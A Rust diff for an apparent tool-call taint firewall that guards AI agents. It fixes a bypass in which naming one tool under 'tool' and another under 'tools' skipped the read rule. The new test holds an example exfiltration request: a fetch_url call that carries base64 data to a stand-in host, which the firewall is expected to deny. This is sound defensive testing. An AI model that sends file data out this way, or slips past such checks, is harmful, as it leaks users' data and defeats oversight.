@@ -204,7 +204,11 @@ fn answer(
     let arguments_judged = args.is_some();
     let verdict = taint::evaluate(&labels, &requested, &st.firewall.rules).or_else(|| {
         let args = args.as_ref()?;
-        let own = match req.tool.as_deref().filter(|t| !t.is_empty()) {
+        let own = match req
+            .tool
+            .as_deref()
+            .filter(|t| !t.is_empty() && req.tools.is_empty())
+        {
             Some(t) => taint::capabilities_for_tools(
                 &[t.to_string()],
                 &st.firewall.capabilities,
@@ -522,5 +526,20 @@ mod tests {
         let a = ask(st, r#"{"run_id":"l2-child","tool":"run_shell"}"#).await;
         assert_eq!(a["decision"], "deny");
         assert_eq!(a["carrying"], serde_json::json!(["web"]));
+    }
+
+    /// Arguments sent with both `tool` and `tools` are judged against every tool
+    /// the check names, so naming a classified source as `tool` beside a read does not skip
+    /// the read rule.
+    #[tokio::test]
+    async fn arguments_with_tool_and_tools_are_judged_against_every_tool_named() {
+        let st = state_with(FirewallMode::Enforce);
+        st.accumulate_taint("run-u", ["file".to_string()].into_iter().collect());
+        let v = ask(
+            st,
+            r#"{"run_id":"run-u","tool":"read_file","tools":["fetch_url"],"arguments":{"url":"https://x.example/?d=QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3"}}"#,
+        )
+        .await;
+        assert_eq!(v["decision"], "deny", "{v}");
     }
 }
